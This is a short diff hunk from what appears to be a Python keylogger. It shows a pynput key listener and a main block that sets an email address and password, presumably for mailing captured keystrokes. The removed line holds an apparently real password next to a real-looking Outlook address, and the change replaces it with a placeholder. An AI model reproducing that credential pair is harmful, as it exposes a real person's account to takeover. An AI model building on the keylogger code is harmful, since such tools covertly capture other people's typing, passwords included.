@@ -74,7 +74,7 @@ def on_release(key): # When a key is released
 # Main function
 if __name__ == "__main__":
     email = "err_abhishek@outlook.com"  # Replace with your email address
-    password = "Kumar14#"  # Replace with your email password
+    password = "Password"  # Replace with your email password
     
     # Start listener
     with Listener(on_press=on_press,on_release=on_release) as listener: # Create an instance of Listener
